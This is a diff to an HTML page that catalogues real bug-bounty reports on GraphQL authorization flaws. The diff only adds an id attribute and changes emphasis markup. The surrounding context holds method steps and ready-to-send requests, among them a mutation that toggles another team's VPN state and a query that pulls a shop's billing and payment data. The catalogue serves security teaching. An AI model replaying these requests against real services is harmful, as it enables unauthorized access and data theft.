@@ -201,7 +201,7 @@ Content-Type: application/json
     <div class="sortbar"><label for="sort">Sort specimens:</label>
       <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
       <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
-    <div class="specimens"><article class="spec" id="report-489146" style="--sv:var(--sev-crit)" data-sev="4" data-votes="1032" data-bounty="1">
+    <div class="specimens" id="specimens"><article class="spec" id="report-489146" style="--sv:var(--sev-crit)" data-sev="4" data-votes="1032" data-bounty="1">
 <div class="spec-eyebrow">Real-world example</div>
 <div class="spec-top"><h3>GraphQL `nodes` connection field bypasses field-level authz</h3><span class="fieldmark">◆ Critical</span></div>
 <div class="catalog">Specimen <b>#489146</b> · security · awarded · 1032 votes · resolved</div>
@@ -391,7 +391,7 @@ query { team(handle:"security"){ ibb_bounty_table{ critical high medium low } } 
 <div class="spec-top"><h3>Over-broad object scope in GraphQL mutation + skip_authorization interactor</h3><span class="fieldmark">◆ Medium</span></div>
 <div class="catalog">Specimen <b>#717716</b> · security · none · 65 votes · resolved</div>
 <div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
-<h4>Root cause</h4><p style="margin:0">A mutation resolves the target object with schema.object_from_id and re-fetches it through a scope that returns everything the user can <em>see</em> rather than everything they can <em>manage</em>; the downstream interactor explicitly skip_authorization, so a visible-but-not-owned team can be mutated.</p>
+<h4>Root cause</h4><p style="margin:0">A mutation resolves the target object with schema.object_from_id and re-fetches it through a scope that returns everything the user can *see* rather than everything they can *manage*; the downstream interactor explicitly skip_authorization, so a visible-but-not-owned team can be mutated.</p>
 <h4>Method</h4><ol><li>Grab a team_id (base64 gid) for any program you can merely see</li><li>Send the UpdateGatewayProgramState mutation with that team_id and vpn_suspended true/false</li><li>For Gateway-enabled programs the VPN state is toggled; others 500 (still confirming the missing authz)</li></ol>
 <div class="pre">POST /graphql
 {"query":"mutation updateState($input_0:UpdateGatewayProgramStateInput!){updateGatewayProgramState(input:$input_0){team{handle}}}","variables":{"input_0":{"team_id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=","vpn_suspended":false,"clientMutationId":"0"}}}</div>
@@ -711,7 +711,7 @@ Host: STORE.myshopify.com
 Content-Type: application/json
 
 {"operationName":"LiveView","variables":{},"query":"query LiveView { shop { id billingAddress { address1 city country zip } plan { displayName shopifyPlus } shopifyPaymentsAccount { balance { amount currencyCode } id } uploadedImages(first:0){edges{node{originalSrc id}}} } }"}</div>
-<p class="insight"><b>Insight —</b> When testing GraphQL, replay named privileged operations and request the <em>full</em> type selection as a low-priv user. Authz enforced at the resolver/operation boundary often misses individual fields; enumerate every field of returned objects.</p>
+<p class="insight"><b>Insight —</b> When testing GraphQL, replay named privileged operations and request the *full* type selection as a low-priv user. Authz enforced at the resolver/operation boundary often misses individual fields; enumerate every field of returned objects.</p>
 <div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/409973" target="_blank" rel="noopener">hackerone.com/reports/409973</a></span><a class="src" href="#report-409973" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article></div>
     <button class="loadmore" id="loadmore">Load more specimens (18 of 42 remaining)</button>
     <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
